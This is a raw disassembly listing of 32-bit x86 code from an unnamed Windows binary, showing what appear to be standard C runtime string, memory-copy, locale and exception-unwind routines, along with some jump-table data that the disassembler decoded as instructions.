  42637d:	cmp    eax,DWORD PTR [ecx+0x4]
  426380:	je     0x426391
  426382:	cmp    eax,DWORD PTR ds:0x45c908
  426388:	je     0x426391
  42638a:	push   eax
  42638b:	call   0x42446a
  426390:	pop    ecx
  426391:	mov    esi,DWORD PTR [esi+0x8]
  426394:	mov    eax,ds:0x45c934
  426399:	cmp    esi,DWORD PTR [eax+0x8]
  42639c:	je     0x4263ad
  42639e:	cmp    esi,DWORD PTR ds:0x45c90c
  4263a4:	je     0x4263ad
  4263a6:	push   esi
  4263a7:	call   0x42446a
  4263ac:	pop    ecx
  4263ad:	pop    esi
  4263ae:	ret    
  4263af:	push   esi
  4263b0:	mov    esi,DWORD PTR [esp+0x8]
  4263b4:	test   esi,esi
  4263b6:	je     0x426486
  4263bc:	mov    eax,DWORD PTR [esi+0xc]
  4263bf:	mov    ecx,DWORD PTR ds:0x45c934
  4263c5:	cmp    eax,DWORD PTR [ecx+0xc]
  4263c8:	je     0x4263d9
  4263ca:	cmp    eax,DWORD PTR ds:0x45c910
  4263d0:	je     0x4263d9
  4263d2:	push   eax
  4263d3:	call   0x42446a
  4263d8:	pop    ecx
  4263d9:	mov    eax,DWORD PTR [esi+0x10]
  4263dc:	mov    ecx,DWORD PTR ds:0x45c934
  4263e2:	cmp    eax,DWORD PTR [ecx+0x10]
  4263e5:	je     0x4263f6
  4263e7:	cmp    eax,DWORD PTR ds:0x45c914
  4263ed:	je     0x4263f6
  4263ef:	push   eax
  4263f0:	call   0x42446a
  4263f5:	pop    ecx
  4263f6:	mov    eax,DWORD PTR [esi+0x14]
  4263f9:	mov    ecx,DWORD PTR ds:0x45c934
  4263ff:	cmp    eax,DWORD PTR [ecx+0x14]
  426402:	je     0x426413
  426404:	cmp    eax,DWORD PTR ds:0x45c918
  42640a:	je     0x426413
  42640c:	push   eax
  42640d:	call   0x42446a
  426412:	pop    ecx
  426413:	mov    eax,DWORD PTR [esi+0x18]
  426416:	mov    ecx,DWORD PTR ds:0x45c934
  42641c:	cmp    eax,DWORD PTR [ecx+0x18]
  42641f:	je     0x426430
  426421:	cmp    eax,DWORD PTR ds:0x45c91c
  426427:	je     0x426430
  426429:	push   eax
  42642a:	call   0x42446a
  42642f:	pop    ecx
  426430:	mov    eax,DWORD PTR [esi+0x1c]
  426433:	mov    ecx,DWORD PTR ds:0x45c934
  426439:	cmp    eax,DWORD PTR [ecx+0x1c]
  42643c:	je     0x42644d
  42643e:	cmp    eax,DWORD PTR ds:0x45c920
  426444:	je     0x42644d
  426446:	push   eax
  426447:	call   0x42446a
  42644c:	pop    ecx
  42644d:	mov    eax,DWORD PTR [esi+0x20]
  426450:	mov    ecx,DWORD PTR ds:0x45c934
  426456:	cmp    eax,DWORD PTR [ecx+0x20]
  426459:	je     0x42646a
  42645b:	cmp    eax,DWORD PTR ds:0x45c924
  426461:	je     0x42646a
  426463:	push   eax
  426464:	call   0x42446a
  426469:	pop    ecx
  42646a:	mov    esi,DWORD PTR [esi+0x24]
  42646d:	mov    eax,ds:0x45c934
  426472:	cmp    esi,DWORD PTR [eax+0x24]
  426475:	je     0x426486
  426477:	cmp    esi,DWORD PTR ds:0x45c928
  42647d:	je     0x426486
  42647f:	push   esi
  426480:	call   0x42446a
  426485:	pop    ecx
  426486:	pop    esi
  426487:	ret    
  426488:	int3   
  426489:	int3   
  42648a:	int3   
  42648b:	int3   
  42648c:	int3   
  42648d:	int3   
  42648e:	int3   
  42648f:	int3   
  426490:	push   ebp
  426491:	mov    ebp,esp
  426493:	push   esi
  426494:	xor    eax,eax
  426496:	push   eax
  426497:	push   eax
  426498:	push   eax
  426499:	push   eax
  42649a:	push   eax
  42649b:	push   eax
  42649c:	push   eax
  42649d:	push   eax
  42649e:	mov    edx,DWORD PTR [ebp+0xc]
  4264a1:	lea    ecx,[ecx+0x0]
  4264a4:	mov    al,BYTE PTR [edx]
  4264a6:	or     al,al
  4264a8:	je     0x4264b3
  4264aa:	add    edx,0x1
  4264ad:	bts    DWORD PTR [esp],eax
  4264b1:	jmp    0x4264a4
  4264b3:	mov    esi,DWORD PTR [ebp+0x8]
  4264b6:	or     ecx,0xffffffff
  4264b9:	lea    ecx,[ecx+0x0]
  4264bc:	add    ecx,0x1
  4264bf:	mov    al,BYTE PTR [esi]
  4264c1:	or     al,al
  4264c3:	je     0x4264ce
  4264c5:	add    esi,0x1
  4264c8:	bt     DWORD PTR [esp],eax
  4264cc:	jae    0x4264bc
  4264ce:	mov    eax,ecx
  4264d0:	add    esp,0x20
  4264d3:	pop    esi
  4264d4:	leave  
  4264d5:	ret    
  4264d6:	int3   
  4264d7:	int3   
  4264d8:	int3   
  4264d9:	int3   
  4264da:	int3   
  4264db:	int3   
  4264dc:	int3   
  4264dd:	int3   
  4264de:	int3   
  4264df:	int3   
  4264e0:	mov    edx,DWORD PTR [esp+0x4]
  4264e4:	mov    ecx,DWORD PTR [esp+0x8]
  4264e8:	test   edx,0x3
  4264ee:	jne    0x42652c
  4264f0:	mov    eax,DWORD PTR [edx]
  4264f2:	cmp    al,BYTE PTR [ecx]
  4264f4:	jne    0x426524
  4264f6:	or     al,al
  4264f8:	je     0x426520
  4264fa:	cmp    ah,BYTE PTR [ecx+0x1]
  4264fd:	jne    0x426524
  4264ff:	or     ah,ah
  426501:	je     0x426520
  426503:	shr    eax,0x10
  426506:	cmp    al,BYTE PTR [ecx+0x2]
  426509:	jne    0x426524
  42650b:	or     al,al
  42650d:	je     0x426520
  42650f:	cmp    ah,BYTE PTR [ecx+0x3]
  426512:	jne    0x426524
  426514:	add    ecx,0x4
  426517:	add    edx,0x4
  42651a:	or     ah,ah
  42651c:	jne    0x4264f0
  42651e:	mov    edi,edi
  426520:	xor    eax,eax
  426522:	ret    
  426523:	nop
  426524:	sbb    eax,eax
  426526:	shl    eax,1
  426528:	add    eax,0x1
  42652b:	ret    
  42652c:	test   edx,0x1
  426532:	je     0x42654c
  426534:	mov    al,BYTE PTR [edx]
  426536:	add    edx,0x1
  426539:	cmp    al,BYTE PTR [ecx]
  42653b:	jne    0x426524
  42653d:	add    ecx,0x1
  426540:	or     al,al
  426542:	je     0x426520
  426544:	test   edx,0x2
  42654a:	je     0x4264f0
  42654c:	mov    ax,WORD PTR [edx]
  42654f:	add    edx,0x2
  426552:	cmp    al,BYTE PTR [ecx]
  426554:	jne    0x426524
  426556:	or     al,al
  426558:	je     0x426520
  42655a:	cmp    ah,BYTE PTR [ecx+0x1]
  42655d:	jne    0x426524
  42655f:	or     ah,ah
  426561:	je     0x426520
  426563:	add    ecx,0x2
  426566:	jmp    0x4264f0
  426568:	int3   
  426569:	int3   
  42656a:	int3   
  42656b:	int3   
  42656c:	int3   
  42656d:	int3   
  42656e:	int3   
  42656f:	int3   
  426570:	mov    eax,DWORD PTR [esp+0xc]
  426574:	test   eax,eax
  426576:	je     0x4265c2
  426578:	mov    edx,DWORD PTR [esp+0x4]
  42657c:	push   esi
  42657d:	push   edi
  42657e:	mov    esi,edx
  426580:	mov    edi,DWORD PTR [esp+0x10]
  426584:	or     edx,edi
  426586:	and    edx,0x3
  426589:	je     0x4265c3
  42658b:	test   eax,0x1
  426590:	je     0x4265a3
  426592:	mov    cl,BYTE PTR [esi]
  426594:	cmp    cl,BYTE PTR [edi]
  426596:	jne    0x4265f0
  426598:	add    esi,0x1
  42659b:	add    edi,0x1
  42659e:	sub    eax,0x1
  4265a1:	je     0x4265c0
  4265a3:	mov    cl,BYTE PTR [esi]
  4265a5:	mov    dl,BYTE PTR [edi]
  4265a7:	cmp    cl,dl
  4265a9:	jne    0x4265f0
  4265ab:	mov    cl,BYTE PTR [esi+0x1]
  4265ae:	mov    dl,BYTE PTR [edi+0x1]
  4265b1:	cmp    cl,dl
  4265b3:	jne    0x4265f0
  4265b5:	add    edi,0x2
  4265b8:	add    esi,0x2
  4265bb:	sub    eax,0x2
  4265be:	jne    0x4265a3
  4265c0:	pop    edi
  4265c1:	pop    esi
  4265c2:	ret    
  4265c3:	mov    ecx,eax
  4265c5:	and    eax,0x3
  4265c8:	shr    ecx,0x2
  4265cb:	je     0x4265f8
  4265cd:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4265cf:	je     0x4265f8
  4265d1:	mov    ecx,DWORD PTR [esi-0x4]
  4265d4:	mov    edx,DWORD PTR [edi-0x4]
  4265d7:	cmp    cl,dl
  4265d9:	jne    0x4265eb
  4265db:	cmp    ch,dh
  4265dd:	jne    0x4265eb
  4265df:	shr    ecx,0x10
  4265e2:	shr    edx,0x10
  4265e5:	cmp    cl,dl
  4265e7:	jne    0x4265eb
  4265e9:	cmp    ch,dh
  4265eb:	mov    eax,0x0
  4265f0:	sbb    eax,eax
  4265f2:	pop    edi
  4265f3:	sbb    eax,0xffffffff
  4265f6:	pop    esi
  4265f7:	ret    
  4265f8:	test   eax,eax
  4265fa:	je     0x4265c0
  4265fc:	mov    edx,DWORD PTR [esi]
  4265fe:	mov    ecx,DWORD PTR [edi]
  426600:	cmp    dl,cl
  426602:	jne    0x4265eb
  426604:	sub    eax,0x1
  426607:	je     0x426625
  426609:	cmp    dh,ch
  42660b:	jne    0x4265eb
  42660d:	sub    eax,0x1
  426610:	je     0x426625
  426612:	and    ecx,0xff0000
  426618:	and    edx,0xff0000
  42661e:	cmp    edx,ecx
  426620:	jne    0x4265eb
  426622:	sub    eax,0x1
  426625:	pop    edi
  426626:	pop    esi
  426627:	ret    
  426628:	int3   
  426629:	int3   
  42662a:	int3   
  42662b:	int3   
  42662c:	int3   
  42662d:	int3   
  42662e:	int3   
  42662f:	int3   
  426630:	push   ebp
  426631:	mov    ebp,esp
  426633:	push   edi
  426634:	push   esi
  426635:	push   ebx
  426636:	mov    ecx,DWORD PTR [ebp+0x10]
  426639:	jecxz  0x426662
  42663b:	mov    ebx,ecx
  42663d:	mov    edi,DWORD PTR [ebp+0x8]
  426640:	mov    esi,edi
  426642:	xor    eax,eax
  426644:	repnz scas al,BYTE PTR es:[edi]
  426646:	neg    ecx
  426648:	add    ecx,ebx
  42664a:	mov    edi,esi
  42664c:	mov    esi,DWORD PTR [ebp+0xc]
  42664f:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426651:	mov    al,BYTE PTR [esi-0x1]
  426654:	xor    ecx,ecx
  426656:	cmp    al,BYTE PTR [edi-0x1]
  426659:	ja     0x426660
  42665b:	je     0x426662
  42665d:	sub    ecx,0x2
  426660:	not    ecx
  426662:	mov    eax,ecx
  426664:	pop    ebx
  426665:	pop    esi
  426666:	pop    edi
  426667:	leave  
  426668:	ret    
  426669:	int3   
  42666a:	int3   
  42666b:	int3   
  42666c:	int3   
  42666d:	int3   
  42666e:	int3   
  42666f:	int3   
  426670:	push   ebp
  426671:	mov    ebp,esp
  426673:	push   esi
  426674:	xor    eax,eax
  426676:	push   eax
  426677:	push   eax
  426678:	push   eax
  426679:	push   eax
  42667a:	push   eax
  42667b:	push   eax
  42667c:	push   eax
  42667d:	push   eax
  42667e:	mov    edx,DWORD PTR [ebp+0xc]
  426681:	lea    ecx,[ecx+0x0]
  426684:	mov    al,BYTE PTR [edx]
  426686:	or     al,al
  426688:	je     0x426693
  42668a:	add    edx,0x1
  42668d:	bts    DWORD PTR [esp],eax
  426691:	jmp    0x426684
  426693:	mov    esi,DWORD PTR [ebp+0x8]
  426696:	mov    edi,edi
  426698:	mov    al,BYTE PTR [esi]
  42669a:	or     al,al
  42669c:	je     0x4266aa
  42669e:	add    esi,0x1
  4266a1:	bt     DWORD PTR [esp],eax
  4266a5:	jae    0x426698
  4266a7:	lea    eax,[esi-0x1]
  4266aa:	add    esp,0x20
  4266ad:	pop    esi
  4266ae:	leave  
  4266af:	ret    
  4266b0:	push   ebp
  4266b1:	mov    ebp,esp
  4266b3:	push   ebx
  4266b4:	push   esi
  4266b5:	push   edi
  4266b6:	push   ebp
  4266b7:	push   0x0
  4266b9:	push   0x0
  4266bb:	push   0x4266c8
  4266c0:	push   DWORD PTR [ebp+0x8]
  4266c3:	call   0x42713e
  4266c8:	pop    ebp
  4266c9:	pop    edi
  4266ca:	pop    esi
  4266cb:	pop    ebx
  4266cc:	mov    esp,ebp
  4266ce:	pop    ebp
  4266cf:	ret    
  4266d0:	mov    ecx,DWORD PTR [esp+0x4]
  4266d4:	test   DWORD PTR [ecx+0x4],0x6
  4266db:	mov    eax,0x1
  4266e0:	je     0x4266f1
  4266e2:	mov    eax,DWORD PTR [esp+0x8]
  4266e6:	mov    edx,DWORD PTR [esp+0x10]
  4266ea:	mov    DWORD PTR [edx],eax
  4266ec:	mov    eax,0x3
  4266f1:	ret    
  4266f2:	push   ebx
  4266f3:	push   esi
  4266f4:	push   edi
  4266f5:	mov    eax,DWORD PTR [esp+0x10]
  4266f9:	push   eax
  4266fa:	push   0xfffffffe
  4266fc:	push   0x4266d0
  426701:	push   DWORD PTR fs:0x0
  426708:	mov    DWORD PTR fs:0x0,esp
  42670f:	mov    eax,DWORD PTR [esp+0x20]
  426713:	mov    ebx,DWORD PTR [eax+0x8]
  426716:	mov    esi,DWORD PTR [eax+0xc]
  426719:	cmp    esi,0xffffffff
  42671c:	je     0x42674c
  42671e:	cmp    esi,DWORD PTR [esp+0x24]
  426722:	je     0x42674c
  426724:	lea    esi,[esi+esi*2]
  426727:	mov    ecx,DWORD PTR [ebx+esi*4]
  42672a:	mov    DWORD PTR [esp+0x8],ecx
  42672e:	mov    DWORD PTR [eax+0xc],ecx
  426731:	cmp    DWORD PTR [ebx+esi*4+0x4],0x0
  426736:	jne    0x42674a
  426738:	push   0x101
  42673d:	mov    eax,DWORD PTR [ebx+esi*4+0x8]
  426741:	call   0x426786
  426746:	call   DWORD PTR [ebx+esi*4+0x8]
  42674a:	jmp    0x42670f
  42674c:	pop    DWORD PTR fs:0x0
  426753:	add    esp,0xc
  426756:	pop    edi
  426757:	pop    esi
  426758:	pop    ebx
  426759:	ret    
  42675a:	xor    eax,eax
  42675c:	mov    ecx,DWORD PTR fs:0x0
  426763:	cmp    DWORD PTR [ecx+0x4],0x4266d0
  42676a:	jne    0x42677c
  42676c:	mov    edx,DWORD PTR [ecx+0xc]
  42676f:	mov    edx,DWORD PTR [edx+0xc]
  426772:	cmp    DWORD PTR [ecx+0x8],edx
  426775:	jne    0x42677c
  426777:	mov    eax,0x1
  42677c:	ret    
  42677d:	push   ebx
  42677e:	push   ecx
  42677f:	mov    ebx,0x45c94c
  426784:	jmp    0x426790
  426786:	push   ebx
  426787:	push   ecx
  426788:	mov    ebx,0x45c94c
  42678d:	mov    ecx,DWORD PTR [ebp+0x8]
  426790:	mov    DWORD PTR [ebx+0x8],ecx
  426793:	mov    DWORD PTR [ebx+0x4],eax
  426796:	mov    DWORD PTR [ebx+0xc],ebp
  426799:	pop    ecx
  42679a:	pop    ebx
  42679b:	ret    0x4
  42679e:	int3   
  42679f:	int3   
  4267a0:	push   ebp
  4267a1:	mov    ebp,esp
  4267a3:	push   edi
  4267a4:	push   esi
  4267a5:	mov    esi,DWORD PTR [ebp+0xc]
  4267a8:	mov    ecx,DWORD PTR [ebp+0x10]
  4267ab:	mov    edi,DWORD PTR [ebp+0x8]
  4267ae:	mov    eax,ecx
  4267b0:	mov    edx,ecx
  4267b2:	add    eax,esi
  4267b4:	cmp    edi,esi
  4267b6:	jbe    0x4267c0
  4267b8:	cmp    edi,eax
  4267ba:	jb     0x42693c
  4267c0:	test   edi,0x3
  4267c6:	jne    0x4267dc
  4267c8:	shr    ecx,0x2
  4267cb:	and    edx,0x3
  4267ce:	cmp    ecx,0x8
  4267d1:	jb     0x4267fc
  4267d3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4267d5:	jmp    DWORD PTR [edx*4+0x4268ec]
  4267dc:	mov    eax,edi
  4267de:	mov    edx,0x3
  4267e3:	sub    ecx,0x4
  4267e6:	jb     0x4267f4
  4267e8:	and    eax,0x3
  4267eb:	add    ecx,eax
  4267ed:	jmp    DWORD PTR [eax*4+0x426800]
  4267f4:	jmp    DWORD PTR [ecx*4+0x4268fc]
  4267fb:	nop
  4267fc:	jmp    DWORD PTR [ecx*4+0x426880]
  426803:	nop
  426804:	adc    BYTE PTR [eax+0x42],ch
  426807:	add    BYTE PTR [eax+ebp*2],bh
  42680a:	inc    edx
  42680b:	add    BYTE PTR [eax+0x68],ah
  42680e:	inc    edx
  42680f:	add    BYTE PTR [ebx],ah
  426811:	ror    DWORD PTR [edx-0x75f877fa],1
  426817:	inc    esi
  426818:	add    DWORD PTR [eax+0x468a0147],ecx
  42681e:	add    al,cl
  426820:	jmp    0x289f027
  426825:	add    esi,0x3
  426828:	add    edi,0x3
  42682b:	cmp    ecx,0x8
  42682e:	jb     0x4267fc
  426830:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426832:	jmp    DWORD PTR [edx*4+0x4268ec]
  426839:	lea    ecx,[ecx+0x0]
  42683c:	and    edx,ecx
  42683e:	mov    al,BYTE PTR [esi]
  426840:	mov    BYTE PTR [edi],al
  426842:	mov    al,BYTE PTR [esi+0x1]
  426845:	shr    ecx,0x2
  426848:	mov    BYTE PTR [edi+0x1],al
  42684b:	add    esi,0x2
  42684e:	add    edi,0x2
  426851:	cmp    ecx,0x8
  426854:	jb     0x4267fc
  426856:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426858:	jmp    DWORD PTR [edx*4+0x4268ec]
  42685f:	nop
  426860:	and    edx,ecx
  426862:	mov    al,BYTE PTR [esi]
  426864:	mov    BYTE PTR [edi],al
  426866:	add    esi,0x1
  426869:	shr    ecx,0x2
  42686c:	add    edi,0x1
  42686f:	cmp    ecx,0x8
  426872:	jb     0x4267fc
  426874:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426876:	jmp    DWORD PTR [edx*4+0x4268ec]
  42687d:	lea    ecx,[ecx+0x0]
  426880:	jecxz  0x4268ea
  426882:	inc    edx
  426883:	add    al,dl
  426885:	push   0x68c80042
  42688a:	inc    edx
  42688b:	add    al,al
  42688d:	push   0x68b80042
  426892:	inc    edx
  426893:	add    BYTE PTR [eax-0x57ffbd98],dh
  426899:	push   0x68a00042
  42689e:	inc    edx
  42689f:	add    BYTE PTR [ebx-0x761b71bc],cl
  4268a5:	inc    esp
  4268a6:	(bad)  
  4268a7:	in     al,0x8b
  4268a9:	inc    esp
  4268aa:	mov    gs,eax
  4268ac:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  4268b0:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  4268b4:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  4268b8:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  4268bc:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  4268c0:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  4268c4:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  4268c8:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  4268cc:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  4268d0:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  4268d4:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  4268d8:	lea    eax,[ecx*4+0x0]
  4268df:	add    esi,eax
  4268e1:	add    edi,eax
  4268e3:	jmp    DWORD PTR [edx*4+0x4268ec]
  4268ea:	mov    edi,edi
  4268ec:	cld    
  4268ed:	push   0x69040042
  4268f2:	inc    edx
  4268f3:	add    BYTE PTR [eax],dl
  4268f5:	imul   eax,DWORD PTR [edx+0x0],0x426924
  4268fc:	mov    eax,DWORD PTR [ebp+0x8]
  4268ff:	pop    esi
  426900:	pop    edi
  426901:	leave  
  426902:	ret    
  426903:	nop
  426904:	mov    al,BYTE PTR [esi]
  426906:	mov    BYTE PTR [edi],al
  426908:	mov    eax,DWORD PTR [ebp+0x8]
  42690b:	pop    esi
  42690c:	pop    edi
  42690d:	leave  
  42690e:	ret    
  42690f:	nop
  426910:	mov    al,BYTE PTR [esi]
  426912:	mov    BYTE PTR [edi],al
  426914:	mov    al,BYTE PTR [esi+0x1]
  426917:	mov    BYTE PTR [edi+0x1],al
  42691a:	mov    eax,DWORD PTR [ebp+0x8]
  42691d:	pop    esi
  42691e:	pop    edi
  42691f:	leave  
  426920:	ret    
  426921:	lea    ecx,[ecx+0x0]
  426924:	mov    al,BYTE PTR [esi]
  426926:	mov    BYTE PTR [edi],al
  426928:	mov    al,BYTE PTR [esi+0x1]
  42692b:	mov    BYTE PTR [edi+0x1],al
  42692e:	mov    al,BYTE PTR [esi+0x2]
  426931:	mov    BYTE PTR [edi+0x2],al
  426934:	mov    eax,DWORD PTR [ebp+0x8]
  426937:	pop    esi
  426938:	pop    edi
  426939:	leave  
  42693a:	ret    
  42693b:	nop
  42693c:	lea    esi,[ecx+esi*1-0x4]
  426940:	lea    edi,[ecx+edi*1-0x4]
  426944:	test   edi,0x3
  42694a:	jne    0x426970
  42694c:	shr    ecx,0x2
  42694f:	and    edx,0x3
  426952:	cmp    ecx,0x8
  426955:	jb     0x426964
  426957:	std    
  426958:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42695a:	cld    
  42695b:	jmp    DWORD PTR [edx*4+0x426a88]
  426962:	mov    edi,edi
  426964:	neg    ecx
  426966:	jmp    DWORD PTR [ecx*4+0x426a38]
  42696d:	lea    ecx,[ecx+0x0]
  426970:	mov    eax,edi
  426972:	mov    edx,0x3
  426977:	cmp    ecx,0x4
  42697a:	jb     0x426988
  42697c:	and    eax,0x3
  42697f:	sub    ecx,eax
  426981:	jmp    DWORD PTR [eax*4+0x42698c]
  426988:	jmp    DWORD PTR [ecx*4+0x426a88]
  42698f:	nop
  426990:	pushf  
  426991:	imul   eax,DWORD PTR [edx+0x0],0x4269c0
  426998:	call   0x8a42ac06
  42699d:	inc    esi
  42699e:	add    esp,DWORD PTR [ebx]
  4269a0:	ror    DWORD PTR [eax-0x117cfcb9],1
  4269a6:	add    ecx,eax
  4269a8:	jmp    0x231ecaf
  4269ad:	cmp    ecx,0x8
  4269b0:	jb     0x426964
  4269b2:	std    
  4269b3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4269b5:	cld    
  4269b6:	jmp    DWORD PTR [edx*4+0x426a88]
  4269bd:	lea    ecx,[ecx+0x0]
  4269c0:	mov    al,BYTE PTR [esi+0x3]
  4269c3:	and    edx,ecx
  4269c5:	mov    BYTE PTR [edi+0x3],al
  4269c8:	mov    al,BYTE PTR [esi+0x2]
  4269cb:	shr    ecx,0x2
  4269ce:	mov    BYTE PTR [edi+0x2],al
  4269d1:	sub    esi,0x2
  4269d4:	sub    edi,0x2
  4269d7:	cmp    ecx,0x8
  4269da:	jb     0x426964
  4269dc:	std    
  4269dd:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4269df:	cld    
  4269e0:	jmp    DWORD PTR [edx*4+0x426a88]
  4269e7:	nop
  4269e8:	mov    al,BYTE PTR [esi+0x3]
  4269eb:	and    edx,ecx
  4269ed:	mov    BYTE PTR [edi+0x3],al
  4269f0:	mov    al,BYTE PTR [esi+0x2]
  4269f3:	mov    BYTE PTR [edi+0x2],al
  4269f6:	mov    al,BYTE PTR [esi+0x1]
  4269f9:	shr    ecx,0x2
  4269fc:	mov    BYTE PTR [edi+0x1],al
  4269ff:	sub    esi,0x3
  426a02:	sub    edi,0x3
  426a05:	cmp    ecx,0x8
  426a08:	jb     0x426964
  426a0e:	std    
  426a0f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a11:	cld    
  426a12:	jmp    DWORD PTR [edx*4+0x426a88]
  426a19:	lea    ecx,[ecx+0x0]
  426a1c:	cmp    al,0x6a
  426a1e:	inc    edx
  426a1f:	add    BYTE PTR [edx+ebp*2+0x42],al
  426a23:	add    BYTE PTR [edx+ebp*2+0x42],cl
  426a27:	add    BYTE PTR [edx+ebp*2+0x42],dl
  426a2b:	add    BYTE PTR [edx+ebp*2+0x42],bl
  426a2f:	add    BYTE PTR [edx+ebp*2+0x42],ah
  426a33:	add    BYTE PTR [edx+ebp*2+0x42],ch
  426a37:	add    BYTE PTR [edi+0x6a],bh
  426a3a:	inc    edx
  426a3b:	add    BYTE PTR [ebx-0x76e371bc],cl
  426a41:	inc    esp
  426a42:	(bad)  
  426a43:	sbb    al,0x8b
  426a45:	inc    esp
  426a46:	mov    ds,WORD PTR [eax]
  426a48:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  426a4c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  426a50:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  426a54:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  426a58:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  426a5c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  426a60:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  426a64:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  426a68:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  426a6c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  426a70:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  426a74:	lea    eax,[ecx*4+0x0]
  426a7b:	add    esi,eax
  426a7d:	add    edi,eax
  426a7f:	jmp    DWORD PTR [edx*4+0x426a88]
  426a86:	mov    edi,edi
  426a88:	cwde   
  426a89:	push   0x42
  426a8b:	add    BYTE PTR [eax-0x4fffbd96],ah
  426a91:	push   0x42
  426a93:	add    ah,al
  426a95:	push   0x42
  426a97:	add    BYTE PTR [ebx+0x5f5e0845],cl
  426a9d:	leave  
  426a9e:	ret    
  426a9f:	nop
  426aa0:	mov    al,BYTE PTR [esi+0x3]
  426aa3:	mov    BYTE PTR [edi+0x3],al
  426aa6:	mov    eax,DWORD PTR [ebp+0x8]
  426aa9:	pop    esi
  426aaa:	pop    edi
  426aab:	leave  
  426aac:	ret    
  426aad:	lea    ecx,[ecx+0x0]
  426ab0:	mov    al,BYTE PTR [esi+0x3]
  426ab3:	mov    BYTE PTR [edi+0x3],al
  426ab6:	mov    al,BYTE PTR [esi+0x2]
  426ab9:	mov    BYTE PTR [edi+0x2],al
  426abc:	mov    eax,DWORD PTR [ebp+0x8]
  426abf:	pop    esi
  426ac0:	pop    edi
  426ac1:	leave  
  426ac2:	ret    
  426ac3:	nop
  426ac4:	mov    al,BYTE PTR [esi+0x3]
  426ac7:	mov    BYTE PTR [edi+0x3],al
  426aca:	mov    al,BYTE PTR [esi+0x2]
  426acd:	mov    BYTE PTR [edi+0x2],al
  426ad0:	mov    al,BYTE PTR [esi+0x1]
  426ad3:	mov    BYTE PTR [edi+0x1],al
  426ad6:	mov    eax,DWORD PTR [ebp+0x8]
  426ad9:	pop    esi
  426ada:	pop    edi
  426adb:	leave  
  426adc:	ret    
  426add:	push   ebp
  426ade:	mov    ebp,esp
  426ae0:	sub    esp,0xc
  426ae3:	mov    eax,ds:0x45c430
  426ae8:	xor    eax,DWORD PTR [ebp+0x4]
  426aeb:	and    BYTE PTR [ebp-0x6],0x0
  426aef:	push   0x6
  426af1:	mov    DWORD PTR [ebp-0x4],eax
  426af4:	lea    eax,[ebp-0xc]
  426af7:	push   eax
  426af8:	push   0x1004
  426afd:	push   DWORD PTR [ebp+0x8]
  426b00:	call   DWORD PTR ds:0x4280dc
  426b06:	test   eax,eax
  426b08:	jne    0x426b0f
  426b0a:	or     eax,0xffffffff
  426b0d:	jmp    0x426b19
  426b0f:	lea    eax,[ebp-0xc]
  426b12:	push   eax
  426b13:	call   0x426e1e
  426b18:	pop    ecx
  426b19:	mov    ecx,DWORD PTR [ebp-0x4]
  426b1c:	xor    ecx,DWORD PTR [ebp+0x4]
  426b1f:	call   0x423f2c
  426b24:	leave  
  426b25:	ret    
  426b26:	push   0x38
  426b28:	push   0x428ea8
  426b2d:	call   0x423858
  426b32:	mov    eax,ds:0x45c430
  426b37:	xor    eax,DWORD PTR [ebp+0x4]
  426b3a:	mov    DWORD PTR [ebp-0x1c],eax
  426b3d:	xor    edi,edi
  426b3f:	mov    DWORD PTR [ebp-0x20],edi
  426b42:	mov    DWORD PTR [ebp-0x24],edi
  426b45:	mov    eax,DWORD PTR [ebp+0x14]
  426b48:	mov    ebx,DWORD PTR [eax]
  426b4a:	mov    DWORD PTR [ebp-0x28],ebx
  426b4d:	mov    DWORD PTR [ebp-0x2c],edi
  426b50:	mov    eax,DWORD PTR [ebp+0x8]
  426b53:	cmp    eax,DWORD PTR [ebp+0xc]
  426b56:	je     0x426ccf
  426b5c:	lea    ecx,[ebp-0x40]
  426b5f:	push   ecx
  426b60:	push   eax
  426b61:	mov    esi,DWORD PTR ds:0x4280a0
  426b67:	call   esi
  426b69:	test   eax,eax
  426b6b:	je     0x426b8d
  426b6d:	cmp    DWORD PTR [ebp-0x40],0x1
  426b71:	jne    0x426b8d
  426b73:	lea    eax,[ebp-0x40]
  426b76:	push   eax
  426b77:	push   DWORD PTR [ebp+0xc]
  426b7a:	call   esi
  426b7c:	test   eax,eax
  426b7e:	je     0x426b8d
  426b80:	cmp    DWORD PTR [ebp-0x40],0x1
  426b84:	jne    0x426b8d
  426b86:	mov    DWORD PTR [ebp-0x2c],0x1
  426b8d:	cmp    DWORD PTR [ebp-0x2c],edi
  426b90:	je     0x426bac
  426b92:	cmp    ebx,0xffffffff
  426b95:	je     0x426b9b
  426b97:	mov    esi,ebx
  426b99:	jmp    0x426ba7
  426b9b:	push   DWORD PTR [ebp+0x10]
  426b9e:	call   0x423e70
  426ba3:	pop    ecx
  426ba4:	mov    esi,eax
  426ba6:	inc    esi
  426ba7:	mov    DWORD PTR [ebp-0x44],esi
  426baa:	jmp    0x426baf
  426bac:	mov    esi,DWORD PTR [ebp-0x44]
